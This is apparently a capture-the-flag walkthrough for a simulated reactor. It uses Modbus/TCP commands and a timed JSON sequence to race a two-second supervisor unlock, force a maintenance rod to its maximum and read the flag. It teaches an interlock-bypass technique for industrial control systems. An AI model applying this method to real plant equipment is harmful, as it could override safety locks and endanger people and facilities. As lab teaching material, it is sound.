# Challenge 08 — Maintenance Override

**Protocol:** Modbus/TCP · **Port:** 502/tcp · **Toolkit module:** `modbus`

---

## The Story

The reactor has a special maintenance mode that allows engineers to change the maintenance rod position.

However, this mode is protected by a supervisor lock. You must unlock it before changing the rod.

The catch is that the unlock stays active for only about 2 seconds. A background system also checks whether the rod is at its previously approved position. If you change the rod while the unlock is active, the system accepts the new position. Otherwise, it changes the rod back to its original value.

Your mission is to unlock the system, move the rod to its maximum position of `100`, make the system accept the change, and keep it stable for approximately 10 seconds.

---

## What You Need to Know

There are a few important Modbus registers in this challenge.

| Register | Name | Purpose |
|---|---|---|
| HR20 | Supervisor Unlock | Opens the maintenance lock. |
| HR21 | Maintenance Rod | Controls the rod position. |
| IR72 | Unlock Timer | Shows the remaining unlock time. |
| IR73 | Last Authorised Value | Shows the rod position accepted by the system. |
| IR74 | Solve Status | Shows whether the challenge is completed. |
| IR48 | Flag | Stores the challenge flag. |

**Important values:**

- Original rod position: `10`
- Maximum rod position: `100`
- Unlock duration: Approximately 2 seconds.
- Required stable time: Approximately 10 seconds.

Our goal is to change the rod from `10` to `100` and make IR73 also show `100`.

First, we connect to the target and check the available registers.

We need to understand the current state of the maintenance system before changing anything.

./bin/sysrupt target set 10.0.1.1

./bin/sysrupt status

- `read-input 0 16` reads the first 16 input registers.
- `read-input 70 6` reads registers 70 to 75, where maintenance information is stored.

## Step 2: Understand the Unlock System

### What are we doing?

Before changing the maintenance rod, we must unlock the supervisor lock.

First, try changing the rod without unlocking it. Then request the unlock and check the remaining time.

### Commands

```bash
./bin/sysrupt modbus write 21 100

./bin/sysrupt modbus write 20 1

./bin/sysrupt modbus read-input 72 1
```

### What is happening?

- Register `20` controls the unlock.
- Writing `1` requests an unlock.
- Register `72` shows how much unlock time remains.
- Register `21` controls the maintenance rod.

<details>
<summary>Show result and explanation</summary>

When we try changing the rod without unlocking it, the system rejects the request.

This happens because the maintenance rod is protected.

The unlock lasts approximately 2 seconds, so we must change the rod quickly after opening the lock.

</details>

## Step 3: Understand the Two Important Problems

There are two things that can make our attempt fail.

### Problem 1: The unlock needs a fresh signal

The unlock works only when its value changes from:

```text
0 → 1
```

This is called a **rising edge**.

Think of it like pressing a button. If the button is already ON, sending ON again does not create a new button press.

So, before unlocking, we must set the register back to `0`.

```bash
./bin/sysrupt modbus write 20 0
```

Now the next write of `1` creates a fresh unlock signal.

### Problem 2: The unlock window is very short

The unlock lasts only around 2 seconds.

Typing separate commands manually can take too long. By the time we send the rod command, the unlock may have expired.

**Solution:** Use the toolkit's `sequence` feature to execute all commands in the correct order over one connection.

---

## Step 4: Create the Timed Sequence

### What are we doing?

We are creating a JSON file containing the commands needed to perform the override.

The sequence will:

1. Turn the unlock OFF.
2. Turn the unlock ON.
3. Set the maintenance rod to `100`.
4. Wait briefly.
5. Check whether the system accepted the new rod position.

### Create the file

```bash
nano maint.seq.json
```

Paste the following:

```json
{
  "name": "maint-override",
  "steps": [
    { "command": "modbus write 20 0" },
    { "command": "modbus write 20 1", "deadline_ms": 1000 },
    { "command": "modbus write 21 100", "deadline_ms": 1800 },
    { "command": "modbus verify 73 100 --input", "delay_before_ms": 400 }
  ]
}
```

Save the file.

### Understand the sequence

| Command | Purpose |
|---|---|
| `modbus write 20 0` | Resets the unlock. |
| `modbus write 20 1` | Opens the supervisor lock. |
| `modbus write 21 100` | Moves the maintenance rod to 100. |
| `modbus verify 73 100 --input` | Checks whether the new position was accepted. |

**What are the timing options?**

- `deadline_ms`: Maximum time allowed for that step after the sequence starts.
- `delay_before_ms`: Waits before executing that step.

For example, `delay_before_ms: 400` waits 400 milliseconds before checking IR73. This gives the background system time to recognize the new rod position.

### Validate and execute the sequence

First, check whether the JSON file is correct:

```bash
./bin/sysrupt sequence validate maint.seq.json
```

Then execute it:

```bash
./bin/sysrupt sequence run maint.seq.json
```

## Step 5: Check Whether the System Accepted the New Position

### What are we doing?

Changing the rod to `100` does not automatically mean the system has accepted the change.

The background system checks the rod position. We need to confirm that its last authorised value has also changed from `10` to `100`.

### Command

```bash
./bin/sysrupt modbus verify 73 100 --input
```

### What does this command do?

It checks whether input register `73` contains the value `100`.

<summary>Show result and explanation</summary>

```text

```

This means the system now treats `100` as the authorised rod position instead of the original value `10`.

</details>

## Step 6: Wait for the Challenge to Complete

### What are we doing?

The new rod position must remain stable for approximately 10 seconds.

We should not change the rod or repeat the unlock sequence during this period.

### Wait for 11 seconds

```bash
sleep 11
```

### Check the solve status

```bash
./bin/sysrupt modbus read-input 74 1
```

The expected result is:

```text
[1]
```

A value of `1` means the solve condition has been satisfied.

### Retrieve the flag

```bash
./bin/sysrupt modbus read-input 48 16
```

The flag is stored in the ASCII output of these registers.

## Important Things to Remember

1. Always write `0` to HR20 before writing `1`. The unlock needs a fresh rising edge.
2. The unlock stays active for only approximately 2 seconds.
3. Use the sequence file instead of manually typing commands one by one.
4. Check IR73 to confirm that the new rod position was accepted.
5. Do not change the rod after it has been accepted.
6. Wait approximately 10 seconds before checking the solve status.
7. Avoid repeatedly opening the unlock. More than 6 rising edges within approximately 2 seconds can trigger a temporary maintenance lockout.

---

## What We Learned

- **Modbus Holding Registers:** Used to control equipment, such as the supervisor unlock and maintenance rod.
- **Input Registers:** Used to read information, such as the unlock timer and solve status.
- **Rising Edge:** A signal change from `0` to `1`.
- **TOCTOU:** A timing problem where something is checked at one moment but changes before the operation finishes.
- **Sequence Engine:** Allows multiple commands to execute in a fixed order over one connection.
- **State Verification:** Always check whether the system accepted a change instead of trusting only the write response.
